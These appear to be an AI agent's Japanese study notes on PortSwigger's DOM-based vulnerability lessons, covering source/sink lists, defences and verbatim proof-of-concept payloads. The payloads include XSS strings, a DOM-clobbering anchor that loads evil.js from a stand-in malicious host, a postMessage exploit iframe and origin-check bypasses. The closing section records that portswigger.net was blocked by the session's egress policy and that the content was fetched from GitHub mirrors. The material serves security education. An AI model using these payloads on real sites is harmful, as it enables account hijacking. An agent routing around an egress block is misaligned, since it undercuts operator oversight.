**被害**: 被害者が開くと任意 XPath クエリが実行される URL を構築でき、異なるデータが取得・処理される可能性がある。

#### XPath injection sink 完全一覧（cheatsheet 逐語）
- `document.evaluate()`
- `element.evaluate()`

**対策**: 信頼できない source のデータを XPath クエリに組み込まない。避けられない場合は、パース時にクエリ構造を壊す文字を含まないよう特定項目を厳格検証する。

---

### 17. DOM-based client-side JSON injection（出典: /web-security/dom-based/client-side-json-injection）

**発生条件**: スクリプトが攻撃者制御データを、JSON データ構造としてパースされる文字列に組み込み、それをアプリが処理すると発生。

#### Client-side JSON injection sink 完全一覧（cheatsheet 逐語）
- `JSON.parse()`
- `jQuery.parseJSON()`
- `$.parseJSON()`

**対策**: 信頼できない source のデータを含む文字列を JSON としてパースしない。避けられない場合は、パース時に JSON 構造を壊す文字を含まないよう特定項目を厳格検証する。

---

### 18. DOM-data manipulation（出典: /web-security/dom-based/dom-data-manipulation）

**発生条件**: スクリプトが攻撃者制御データを、DOM 内のフィールド（可視 UI やクライアントサイドロジックで使われるフィールド）に書き込むと発生。攻撃者が要素の `src` プロパティを変更できれば、悪意ある JavaScript ファイルを読み込ませて意図しない動作を誘発できる。

#### DOM-data manipulation sink 完全一覧（cheatsheet 逐語）
- `script.src`
- `script.text`
- `script.textContent`
- `script.innerText`
- `element.setAttribute()`
- `element.search`
- `element.text`
- `element.textContent`
- `element.innerText`
- `element.outerText`
- `element.value`
- `element.name`
- `element.target`
- `element.method`
- `element.type`
- `element.backgroundImage`
- `element.cssText`
- `element.codebase`
- `document.title`
- `document.implementation.createHTMLDocument()`
- `history.pushState()`
- `history.replaceState()`

**対策**: 信頼できない source のデータを DOM データフィールドに動的に書き込まない。ユーザー入力（特に `location.search`／`location.hash`／`location.pathname` 由来）をサニタイズ・検証し、厳格な CSP を実装して被害を緩和する。`script.src` や `setAttribute()` にユーザー制御入力を渡さない。

---

### 19. DOM-based denial of service（出典: /web-security/dom-based/denial-of-service）

**発生条件**: スクリプトが攻撃者制御データを、**問題のあるプラットフォーム API**（呼び出しにより CPU やディスク容量を過剰消費させうる API）に安全でなく渡すと発生。

#### Denial of service sink 完全一覧（cheatsheet 逐語）
- `requestFileSystem()`
- `RegExp()`

**対策**: 信頼できない source のデータを問題のあるプラットフォーム API に動的に渡さない。避けられない場合はクライアントサイドで DoS を防ぐ防御を実装し、多くの場合は安全と分かる内容のみ許可する whitelist 方式で検証する。
〔補足（一般知識）〕`RegExp()` が sink になるのは、攻撃者が catastrophic backtracking を起こす正規表現を注入できる場合（ReDoS）。`requestFileSystem()` は大量ディスク確保による DoS。

---

### 20. その他のカテゴリ（タスク指示で言及、PortSwigger本編の主一覧外）

タスク指示には、上記に加えて **form-action hijacking** と **client-side HTTP parameter pollution（HPP）** の列挙が求められている。これらは PortSwigger の DOM-based トップ一覧表の16カテゴリには**含まれていない**（一覧の16カテゴリは §3 の表の通り）。ただし密接に関連するため、二次情報で補完する。

〔補足（一般知識・二次情報）〕
- **Form-action hijacking**: フォームの `action` 属性（DOMベースでは `element.action` sink、§11 link manipulation の範疇）を攻撃者制御データで動的設定すると、CSRF トークン・ユーザー入力値を含むフォーム内容が、攻撃者制御の URL に送信されてしまう。対策はフォームの action URL をハードコードするか、許可 URL の allowlist を用いること。（出典: OWASP「Form action hijacking」）
- **Client-side HTTP parameter pollution（HPP）**: 反映されたパラメータ値の中に URL エンコードした `&` を注入し、生成されるリンクや form action の中に `&HPP_TEST`（あるいは `&amp;HPP_TEST`）が復号されて現れるかを見る。DOM ベース HPP は、汚染パラメータがレスポンス本文でなく JavaScript／DOM オブジェクト内に注入され、ページ生成時に汚染された DOM/JS が作られる形で発生する。React・Angular・Vue.js のような SPA でリスクが高い。`data`／`src`／`href` 属性や form の action 内に HPP ベクタが無いか注意する。（出典: OWASP WSTG「Testing for HTTP Parameter Pollution」, HackTricks 等の二次情報）
  ※ PortSwigger には KB issue「Client-side HTTP parameter pollution (reflected)」が存在するが、DOM-based レッスンの主一覧には含まれない。

---

### 21. 診断ツール: Burp Suite スキャナ と DOM Invader（出典: /web-security/dom-based, Burp documentation）

- **Burp Suite Web脆弱性スキャナ**: JavaScript の静的解析と動的解析を組み合わせ、DOM ベース脆弱性の検出を高信頼で自動化する。
- **DOM Invader**: Burp 内蔵ブラウザに拡張機能としてプリインストールされる、ブラウザベースの DOM XSS テストツール。既定では無効（他のテストと干渉しうるため）。DOM XSS のテストは、数千行に及ぶ複雑な JavaScript を通る入力フローを手で追う作業になりがちで面倒だが、DOM Invader は入力が流れ込む sink とその周辺文脈を即座に表示して大幅に効率化する。
  - 仕組み: 事前定義の **canary（カナリア）文字列**（任意だが識別しやすい英数字列）を各 source に注入し、DOM を自動パースして canary の出現箇所（＝到達 sink）を探す。
  - **augmented DOM view**（拡張DOMビュー）で、制御可能な sink を即座に特定でき、XSS の文脈と入力がどうサニタイズされているかを示す。
  - `postMessage()` で送られる web message を**ログ**でき、web message を**改変して再送**できる（web message DOM XSS のテスト）。

---

### 22. 全カテゴリ共通の根本対策（出典: /web-security/dom-based「How to prevent DOM-based taint-flow vulnerabilities」）

- 最も効果的なのは、**信頼できない source のデータが、いかなる sink に渡る値をも動的に変えられないようにする**こと（source→sink の taint-flow を断つ）。
- 機能上避けられない場合は、クライアントサイドコードで防御を実装する。多くのカテゴリで共通する具体策は **allowlist（whitelist）による厳格な検証**、および sink の性質に応じた出力エンコード／パラメータ化／安全な API 選択（`innerHTML`→`textContent`、生 SQL→パラメータ化クエリ 等）。
- 影響緩和として **CSP** を併用する（特に XSS 系）。

---

## 補完: PortSwigger 原文の逐語回収（GitHub ミラー経由・2026-09-18）

> 本節は補完パスで新規追加。PortSwigger 本体は依然ブロックだが、逐語ミラー（`musclebigger/cyber-security-knowledge-engine`、`apuromafo/Academia_Backup`）から**原文（英語）を一字一句回収**した。以下、原文を引用（```コードフェンス／> 引用```）し、日本語で注釈する。初回に WebSearch 要約（partial）だった箇所を、ここで原文レベル（full 相当）に格上げする。ミラーは各ページに `来源：<portswigger URL>` を明記しており、2つの独立ミラーの本文が相互一致することで信頼性を担保している。

### A. DOM-based トップページの原文（出典: /web-security/dom-based、逐語ミラー）

**「What is the DOM?」冒頭（逐語）**:
> The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. … DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

**最も一般的な source（URL）の脆弱コード例（逐語・初回ノートに無かった原文コード）**:
```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```
原文の解説（逐語要旨）: これは `location.hash` を安全でなく扱うため **DOM-based open redirection** に脆弱。URL のハッシュ断片が `https:` で始まると、その値を `location` に代入する。攻撃 URL の逐語例:
```
https://www.innocent-website.com/example#https://www.evil-user.net
```
被害者がこの URL を開くと `location` が `https://www.evil-user.net` に設定され、悪性サイトへ自動リダイレクトされる（フィッシングの起点）。

**「How to prevent DOM-based taint-flow vulnerabilities」全文（逐語）**:
> There is no single action you can take to eliminate the threat of DOM-based attacks entirely. However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.
>
> If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code. In many cases, the relevant data can be validated on a whitelist basis, only allowing content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context into which the data is to be inserted, may involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.

（訳）DOM ベース攻撃の脅威を完全に排除する単一の対策は無い。最も効果的なのは、信頼できない source のデータが sink に渡る値を動的に変えられないようにすること。避けられない場合はクライアントサイドで防御を実装し、多くの場合は**安全と分かる内容のみ許可する whitelist 検証**を行う。他のケースではサニタイズ／エンコードが必要で、挿入先の文脈に応じて **JavaScript エスケープ・HTML エンコード・URL エンコードを適切な順序で組み合わせる**複雑な作業になりうる。

### B. 【新規】DOM clobbering（出典: /web-security/dom-based/dom-clobbering、逐語ミラー）

初回ノートに欠落していた PortSwigger 公式カテゴリ。**XSS が不可能でも、`id`/`name` 属性が許可された HTML を注入できる場面で、JS のグローバル変数やオブジェクトのプロパティを DOM ノードで「上書き（clobber）」する**高度技法。

**定義（逐語）**:
> DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

「clobbering」の語源（逐語要旨）: グローバル変数やオブジェクトのプロパティを DOM ノード/HTML コレクションで上書きすること。例えば `submit` のような名前を上書きして、フォームの実 `submit()` 関数を妨害できる。

**代表的な脆弱パターンと exploit（逐語）**:
```javascript
var someObject = window.someObject || {};
```
上のように「グローバル変数 ‖ 空オブジェクト」で初期化するコードがあり、HTML を制御できると `someObject` をアンカー要素で clobber できる。脆弱コード例（逐語）:
```html
<script>
window.onload = function(){
  let someObject = window.someObject || {};
  let script = document.createElement('script');
  script.src = someObject.url;
  document.body.appendChild(script);
};
</script>
```
これを exploit する注入 HTML（逐語）:
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
仕組み（逐語要旨）: 同じ `id` の2つのアンカーが DOM コレクションにまとめられ、`someObject` 参照をそのコレクションで上書き。最後のアンカーの `name=url` により `someObject.url` プロパティが外部スクリプトを指すよう clobber され、動的 `script.src` に悪性 JS が読み込まれる。

**`attributes` プロパティの clobbering によるフィルタ回避（逐語）**:
```html
<form onclick=alert(1)><input id=attributes>Click me
```
仕組み（逐語要旨）: クライアント側フィルタが `form` の `attributes` を列挙してブラックリスト属性を除去しようとするが、`attributes` が `input` 要素で clobber されているため、フィルタは `input` を走査。`input.attributes.length` が未定義で `for` ループ条件（例 `i<element.attributes.length`）を満たさず、属性除去が行われないまま `onclick` が生き残り `alert()` が実行される。

**対策（逐語）**:
> * Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.
> * Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.
> * Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.

（訳）①オブジェクト/関数が正当か検査する（DOM をフィルタするなら、それが DOM ノードでないことを確認。例えば `attributes` が本当に `NamedNodeMap` のインスタンスか検査）。②`||` とグローバル変数を組み合わせる悪いパターンを避ける。③DOM clobbering を考慮した実績あるライブラリ（**DOMPurify** 等）を使う。

### C. DOM XSS 本編の「テスト手法」原文（出典: /web-security/cross-site-scripting/dom-based、逐語ミラー・抓取 2026-09-05）

初回ノート §4 の要約を原文で裏付け・補強する。

**What is DOM-based XSS（逐語）**:
> DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

補足（逐語）: source は URL（`window.location`）が最も一般的。**404 ページ狙いや PHP サイトなど特定状況では、ペイロードを URL の path 部分に置ける**こともある。

**Testing HTML sinks（逐語）**:
> To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use `Control+F` … to search the DOM for your string.

補足（逐語要旨）: 文字列が現れた各箇所で**文脈（属性内/タグ内 等）を特定**し、二重引用符属性内なら `"` を注入してブレイクアウトを試す。**ブラウザ差**: Chrome/Firefox/Safari は `location.search`/`location.hash` を URL エンコードするが、IE11 と（Chromium 前の）Edge はしない。エンコードされると XSS は成立しにくい。

**Testing JavaScript execution sinks（逐語要旨）**: これらの sink では入力が DOM に現れないため検索できない。`Control+Shift+F` でページ全 JS から source（`location` 等）の参照箇所を探し、**JavaScript デバッガでブレークポイント**を置き、値が別変数に代入されて sink へ流れる経路を追う。sink 到達直前に変数へホバーして値を確認し、入力を精緻化する。

**Exploiting: document.write と innerHTML の差（逐語）**:
- `document.write` は `script` 要素が使える:
```javascript
document.write('... <script>alert(document.domain)</script> ...');
```
（周囲の文脈により、既存要素を閉じてからペイロードを置く必要あり）
- `innerHTML` はモダンブラウザで `script` を受け付けず `svg onload` も発火しない。`img`/`iframe` + `onerror`/`onload` を使う:
```javascript
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

**DOM XSS in jQuery（逐語コード）** — `attr()` で `href` を書き換える脆弱コードとペイロード:
```javascript
$(function() {
  $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
```
?returnUrl=javascript:alert(document.domain)
```
`$()` セレクタ + `location.hash` の古典的脆弱パターン（逐語）:
```javascript
$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView();
});
```
補足（逐語要旨）: 新しめの jQuery は `#` 始まりの入力での HTML 注入を防いでパッチ済みだが、`#` プレフィックス不要な source から `$()` 入力を完全制御できれば依然脆弱。ユーザー操作なしで `hashchange` を発火させる最簡手段は iframe:
```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

**DOM XSS in AngularJS（逐語）**: `ng-app` 属性を持つ要素は AngularJS で処理され、**二重波括弧 `{{ }}` 内の JavaScript が、山括弧やイベント無しでも**評価される（HTML 直書き・属性内いずれも可）。

**DOM XSS combined with reflected/stored data（逐語要旨）**: source はブラウザが直接公開するものに限らず、**サーバが URL パラメータを HTML 応答に反映**する場合、reflected DOM XSS になりうる（反映値が JS 文字列リテラルやフォーム項目に入り、ページのスクリプトがそれを危険な sink に書く）。例:
```javascript
eval('var data = "reflected string"');   // reflected DOM XSS
element.innerHTML = comment.author;       // stored DOM XSS
```

### D. Web message を source とする攻撃の原文（出典: /web-security/dom-based/controlling-the-web-message-source、逐語）

初回ノート §5 を原文コードで補強する。

**無検証リスナーの脆弱コード（逐語）**:
```html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```
**exploit iframe（逐語）**:
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
リスナーが origin を検証せず、送信側が `targetOrigin` に `"*"` を指定しているため、ペイロードがそのまま `eval()`（sink）へ渡る。

**Origin verification の欠陥（逐語）** — `indexOf` による部分一致検証は迂回可能:
```javascript
window.addEventListener('message', function(e) {
  if (e.origin.indexOf('normal-website.com') > -1) {
    eval(e.data);
  }
});
```
> an attacker could easily bypass this verification step if the origin of their malicious message was `http://www.normal-website.com.evil.net`, for example.

`startsWith()`/`endsWith()` にも同じ欠陥（逐語）— 次のリスナーは `http://www.malicious-websitenormal-website.com` を安全と誤認する:
```javascript
window.addEventListener('message', function(e) {
  if (e.origin.endsWith('normal-website.com')) {
    eval(e.data);
  }
});
```

### E. Web message manipulation（送信側）の原文（出典: /web-security/dom-based/web-message-manipulation、逐語）

初回ノートは「controlling-the-web-message-source（受信側）」と「web-message-manipulation（送信側）」を混在させていた。原文では**別ページ**であり、送信側は次の定義（逐語）:
> Web message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser.

sink（逐語）: `postMessage()`。対策（逐語）: 信頼できない source を含む web message を送らない／クロスオリジン送信時は**送信先ウィンドウ（targetOrigin）を必ず明示**／**受信メッセージの origin を堅牢に検証**する。

### F. 各サブページ「arise when …」定義・impact の逐語（出典: 各サブページ、逐語ミラー）

初回ノートで WebSearch 要約だった定義文を原文で確定する（sink 一覧は §6〜§19 に既収録、ここでは定義・impact の逐語を補う）。

- **Open redirection**（逐語コード＋impact）: 脆弱コード
  ```javascript
  let url = /https?:\/\/.+/.exec(location.hash);
  if (url) {
    location = url[0];
  }
  ```
  impact 逐語要旨: 正当なアプリ URL（正しいドメイン・有効な TLS 証明書）を使えるためフィッシングに信頼性を与える。**攻撃者がリダイレクト API に渡す文字列の先頭を制御できれば、`javascript:` 疑似プロトコルで JavaScript injection へ格上げ**できる。原文の「Read more」は `URL validation bypass cheat sheet`（`/web-security/ssrf/url-validation-bypass-cheat-sheet`）にリンク。
- **Cookie manipulation**（逐語）: > DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie. 脆弱コード `document.cookie = 'cookieName='+location.hash.slice(1);`。impact 逐語要旨: cookie 値が挙動制御（production 対 demo 等）なら意図しない動作を誘発。セッション追跡なら **session fixation**。さらに「**脆弱サイトだけでなく同一親ドメイン配下の他サイトも攻撃対象になりうる**」。cookie を HTML エンコードせず反映するサイトでは cookie 操作で XSS も可能。
- **Ajax request-header manipulation**（逐語）: > Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an `XmlHttpRequest` object. impact: 当該ヘッダがサーバ処理で果たす役割に依存。他の攻撃と連鎖する起点になりうる。
- **Client-side JSON injection**（逐語）: > DOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application.
- **Client-side SQL injection**（逐語）: > Client-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. impact 逐語要旨: DB がメッセージ等の機微データを保持するなら窃取、送信保留アクションを保持するなら改変・なりすまし操作。sink は `executeSql()`。対策はパラメータ化クエリ（`?` プレースホルダ、全変数をパラメータ化）。
- **Client-side XPath injection**（逐語）: > DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query.
- **Denial of service**（逐語）: > DOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space. 副作用として、ブラウザが `localStorage` への保存拒否やビジースクリプト強制終了などで機能制限することがある。sink: `requestFileSystem()` / `RegExp()`。
- **Document-domain manipulation**（逐語）: > Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property. 補足（逐語要旨）: 異なる origin の2ページが同じ `document.domain` を設定すると無制限に相互作用できる。攻撃者が標的ページと自制御ページを同一 `document.domain` にできれば、既に制御するページ経由で標的ページを完全掌握でき、**通常の XSS と同等の悪用可能性**。ブラウザは値に制約を課すが、①**子/親ドメインへの変更は許可**（弱い関連サイトへ切替可能）、②一部**ブラウザのクセで無関係ドメインへ切替**できる場合あり。深刻度は「通常 XSS に肉薄」。
- **DOM-data manipulation**（逐語）: > DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic. reflected/stored 両方で悪用可。impact 逐語要旨: 軽度では画面の virtual defacement（テキスト/画像改変）、重度では要素の `src` 改変で悪性 JS 読込→意図しない動作。**Burp の静的解析はこれを自動検出するが誤検知（実際には悪用不可）もあるため、コードと実行経路を精査せよ**（逐語の注記）。
- **HTML5-storage manipulation**（逐語）: > HTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either `localStorage` or `sessionStorage`). それ自体は脆弱性でないが、後で読み戻して安全でなく処理すると XSS/JS injection の配送路になる。
- **JavaScript injection**（逐語）: > DOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript. impact: セッショントークン/認証情報窃取、なりすまし操作、キーロギング等。
- **Link manipulation**（逐語）: > DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. impact 逐語（4点）: ①任意外部 URL への誘導（フィッシング）、②機微フォームデータを攻撃者サーバへ送信、③リンクのファイル/クエリ文字列を変え意図しない動作、④**オンサイトリンクに XSS を仕込み、ブラウザの anti-XSS 防御を回避**（anti-XSS は通常オンサイトリンクを考慮しない）。
- **Local file-path manipulation**（逐語）: > Local file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the `filename` parameter. impact 逐語要旨: サイトがファイルを読むなら攻撃者がデータ窃取、書くなら攻撃者が任意データ書込（例: OS 設定ファイル）。実悪用は他の適切な機能の存在に依存。
- **WebSocket-URL poisoning**（逐語）: > WebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection. impact 逐語要旨: サイトが機微データを WebSocket サーバへ送るなら攻撃者が捕捉、サーバからのデータを処理するならロジック改変やクライアント側攻撃の配送。sink: `WebSocket` コンストラクタ。

### G. 補完で判明した初回ノートからの訂正・追加点

1. **§3 代表 sink 表の訂正**: Link manipulation の example sink は原文では `element.src`（初回は `element.href`）。修正済み。`element.href` は §11 の完全 sink 一覧に含まれる。
2. **DOM clobbering の追加**: 初回ノートに欠落していた公式カテゴリを本節 B に逐語で追加（`||` パターン、アンカー2連 clobber、`attributes` clobber、DOMPurify 対策）。
3. **web message の受信側/送信側の分離**: 初回は混在。受信側＝controlling-the-web-message-source（本節 D）、送信側＝web-message-manipulation（本節 E）として原文で分離。
4. **各サブページ定義文を原文（arise when …）で確定**: 初回の WebSearch 要約を逐語に格上げ（本節 F）。

---

## 読者が自分で開くべき資料

PortSwigger 本体（`portswigger.net`）は本セッションの egress ポリシーで全面ブロックされており、公式ドメインからの直接取得はできなかった（`web.archive.org` `archive.ph` `r.jina.ai` 等の代替も同様に 403 拒否）。ただし**補完パスで GitHub 逐語ミラーから本文を原文レベルで回収済み**（上記「補完」節）。読者は最新性の確認と枝葉の言い回しの照合のため、可能なら自分の環境で一次原典を開くこと。以下は読みどころ。

1. **DOM-based vulnerabilities（トップ）** `https://portswigger.net/web-security/dom-based`
   - source と sink の公式定義（本ノート §1 に逐語収録済み）
   - 16カテゴリと「代表 sink」の一覧表（本ノート §3 に再現済み。原典で最新の対応を確認）
   - 「How to prevent DOM-based taint-flow vulnerabilities」の節（共通対策の原文）
   - 各カテゴリへのリンク集（サブページの入口）
2. **DOM-based XSS 本編** `https://portswigger.net/web-security/cross-site-scripting/dom-based`
   - HTML sink のテスト手順（canary 文字列→開発者ツールで DOM 検査、View source が使えない理由）
   - jQuery（`attr()`, `$()` セレクタ, `hashchange`）と AngularJS を使った DOM XSS の具体例
   - 反射型/保存型データと組み合わさる DOM XSS
   - 対応する全ラボ（apprentice〜practitioner）のリンク
3. **各サブページ（16カテゴリ）** 例: `/open-redirection`, `/cookie-manipulation`, `/javascript-injection`, `/document-domain-manipulation`, `/websocket-url-poisoning`, `/link-manipulation`, `/web-message-manipulation`, `/controlling-the-web-message-source`, `/ajax-request-header-manipulation`, `/local-file-path-manipulation`, `/client-side-sql-injection`, `/html5-storage-manipulation`, `/client-side-xpath-injection`, `/client-side-json-injection`, `/dom-data-manipulation`, `/denial-of-service`
   - 各ページの「発生条件（arise when ...）」「具体コード例」「How to prevent ...」の**原文は本ノートの「補完」節 F に逐語回収済み**。最新改訂の照合のため原典も確認するとよい。
4. **【補完で追加】DOM clobbering ページ** `https://portswigger.net/web-security/dom-based/dom-clobbering`
   - 初回ノートに欠落していた公式カテゴリ。本文は「補完」節 B に逐語収録。`||` パターン・アンカー2連 clobber・`attributes` clobber・DOMPurify 対策を確認。関連ラボ（DOM XSS via DOM clobbering 等）も同ページからアクセス可。
5. **DOM Invader ドキュメント** `https://portswigger.net/burp/documentation/desktop/tools/dom-invader/`（および `.../dom-xss`, `.../web-messages`, `.../settings`）
   - canary 設定、augmented DOM view、web message のログ/改変再送の操作手順
6. **代替として全 sink 一覧を逐語で読める GitHub ミラー** `https://github.com/Sivnerof/Sources-And-Sinks-Cheatsheet`（raw: `https://raw.githubusercontent.com/Sivnerof/Sources-And-Sinks-Cheatsheet/main/README.md`）
   - 本ノートの sink 一覧はここから逐語取得。PortSwigger が読めない環境でも sink リストの原文相当を確認できる。
7. **【補完で追加】DOM-based トップ＋16サブページ＋DOM clobbering の逐語ミラー** `https://github.com/musclebigger/cyber-security-knowledge-engine`（raw: `.../main/data/knowledge-base/dom-based/README.md`）と、DOM XSS 本編の逐語ミラー `.../main/data/portswigger-academy/web-security__cross-site-scripting__dom-based.md`
   - 各ページに `来源：<portswigger URL>` 付き。PortSwigger が読めない環境で**原文（英語）をそのまま読める**最有力の代替。本ノート「補完」節の一次ソース。
8. **【補完で追加】DOM-based トップの別ミラー（相互検証用）** `https://github.com/apuromafo/Academia_Backup`（raw: `.../main/Portswigger/portswigger_academy_content_md/dom-based/dom-based.md`）
   - musclebigger と本文一致を確認済み。逐語コピーの信頼性を裏付ける第2の独立ミラー。
9. **ラボ walkthrough（逐語ペイロード付き）** `https://github.com/frank-leitner/portswigger-websecurity-academy`（`15_DOM_based_vulnerabilities/` と `11_cross_site_scripting_XSS/` の DOM 系）
   - 実際の脆弱コードと攻撃ペイロードの実例（本ノート §4〜§7 に逐語収録）。手を動かす際の手順確認に。
